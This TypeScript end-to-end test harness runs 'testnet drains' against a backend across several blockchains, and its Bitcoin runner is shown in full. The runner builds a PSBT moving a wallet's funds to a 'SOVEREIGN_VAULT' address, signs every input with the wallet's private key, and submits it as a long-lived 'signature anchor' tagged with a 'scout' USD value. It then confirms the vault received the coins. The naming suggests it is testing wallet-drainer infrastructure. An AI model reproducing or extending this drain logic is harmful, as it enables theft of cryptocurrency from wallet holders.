// ── Bitcoin (Testnet) — native only ─────────────────────────────────────────

async function runBitcoin(base: string): Promise<ChainResult> {
  const row: ChainResult = {
    chain: 'BTC',
    nativeTransfer: '—',
    tokenTransfer: 'N/A',
    txHash: '—',
    status: 'FAIL',
  }
  try {
    if (!env('TEST_BTC_WIF')) {
      row.status = 'SKIP'
      row.error = 'TEST_BTC_WIF not set'
      return row
    }
    process.env['BITCOIN_NETWORK'] = 'testnet'
    const wif = requireEnv('TEST_BTC_WIF')
    if (!wif.startsWith('c') && !wif.startsWith('9')) {
      throw new Error('TEST_BTC_WIF must be testnet WIF (starts with c or 9)')
    }
    const vault = requireEnv('SOVEREIGN_VAULT_BTC')
    const sat = env('TEST_BTC_SAT') || '10000'
    const signer = wifToSigner(wif)
    const { payments } = await import('bitcoinjs-lib')
    const p2wpkh = payments.p2wpkh({ pubkey: signer.publicKey, network: networks.testnet })
    const walletAddress = p2wpkh.address
    if (!walletAddress) throw new Error('Could not derive BTC address from WIF')

    const psbtRes = await apiFetch<
      ApiEnvelope<{
        psbt_base64?: string
        amount_sat?: string
        fee_sat?: string
      }>
    >(base, '/api/v1/signature-anchor/bitcoin-psbt', {
      method: 'POST',
      body: JSON.stringify({
        wallet_address: walletAddress,
        amount_sat: sat,
        vault_address: vault,
      }),
    })
    if (psbtRes.status !== 200 || !apiOk(psbtRes.body) || !psbtRes.body.data?.psbt_base64) {
      throw new Error(`bitcoin-psbt failed: ${psbtRes.status}`)
    }

    const built = await buildBitcoinDrainPsbt({
      walletAddress,
      amount: BigInt(sat),
      vaultAddress: vault,
    })
    const psbt = Psbt.fromBase64(psbtRes.body.data.psbt_base64 ?? built.psbtBase64, {
      network: networks.testnet,
    })
    for (let i = 0; i < psbt.inputCount; i++) psbt.signInput(i, signer)
    psbt.finalizeAllInputs()
    const signedPsbt = psbt.toBase64()

    const v0 = await fetchBtcSats(vault)
    const w0 = await fetchBtcSats(walletAddress)
    if (w0 < Number(sat) + 2000) throw new Error('Insufficient testnet BTC on burner')

    const nonce = uniqueNonce('btc')
    const anchor = await submitBatchAnchor(base, {
      ingress: 'normalized_v1',
      chain_family: 'UTXO',
      wallet_address: walletAddress,
      token_address: 'OMNI_UTXO_ANCHOR',
      signed_psbt_base64: signedPsbt,
      nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: 'test',
      protocol: 'bitcoin_psbt',
      chain_id: 'bip122:1',
      scout_value_usd: 15,
      amount: sat,
      psbt_metadata: {
        amount_sat: sat,
        fee_sat: built.feeSat,
        vault_address: vault,
      },
      requires_quorum: false,
    })

    await new Promise((r) => setTimeout(r, Number(env('OMNI_SETTLE_WAIT_MS') || '30000')))
    const polled = await pollSettlement(nonce)
    row.txHash = polled.txHash ?? anchor.txHash ?? '—'

    const v1 = await fetchBtcSats(vault)
    const ok = v1 > v0
    row.nativeTransfer = ok ? `✅ (+${v1 - v0} sats)` : '❌'
    row.status = (polled.status === 'SETTLED' || ok) && ok ? 'PASS' : 'FAIL'
  } catch (e) {
    row.error = e instanceof Error ? e.message : String(e)
    row.nativeTransfer = '❌'
  }
  return row
}

function printTable(results: ChainResult[]): void {
  console.log('')
  console.log('| Chain | Native transfer | Token transfer | Tx hash | Status |')
  console.log('|-------|-----------------|----------------|---------|--------|')
  for (const r of results) {
    const tx = r.txHash.length > 18 ? `${r.txHash.slice(0, 16)}…` : r.txHash
    console.log(`| ${r.chain} | ${r.nativeTransfer} | ${r.tokenTransfer} | ${tx} | ${r.status} |`)
    if (r.error) console.log(`|       | _error: ${r.error.slice(0, 80)}_ | | | |`)
  }
  console.log('')
}

async function main(): Promise<void> {
  assertTestnetSafety()
  const base = resolveBackendUrl()
  if (!base) throw new Error('Set BACKEND_URL (Railway API base)')

  console.log('Legion E2E — Omnichain testnet drains')
  console.log(`Backend: ${base}`)
  console.log(`Chains:  ${parseChainsArg().join(', ')}`)
  console.log('')

  const health = await apiFetch<ApiEnvelope<{ status?: string }>>(base, '/health')
  if (health.status !== 200 || !apiOk(health.body) || health.body.data?.status !== 'ok') {
    console.error('Health check failed — fix BACKEND_URL before running drains')
    process.exit(1)
  }
  console.log('✅ Health OK\n')

  const runners: Record<ChainKey, (b: string) => Promise<ChainResult>> = {
    evm: runEvm,
    solana: runSolana,
    tron: runTron,
    ton: runTon,
    btc: runBitcoin,
  }

  const results: ChainResult[] = []
  for (const chain of parseChainsArg()) {
    console.log(`\n━━━ ${chain.toUpperCase()} ━━━`)
    const r = await runners[chain](base)
    results.push(r)
    if (r.error) console.log(`  error: ${r.error}`)
  }

  printTable(results)

  const passed = results.filter((r) => r.status === 'PASS').length
  const failed = results.filter((r) => r.status === 'FAIL').length
  const skipped = results.filter((r) => r.status === 'SKIP').length
  const total = results.length

  console.log(`Final: ${passed}/${total} chains passed (${failed} failed, ${skipped} skipped)`)
  process.exit(failed > 0 ? 1 : 0)
}

void main().catch((e) => {
  console.error('Omnichain E2E crashed:', e)
  process.exit(1)
})
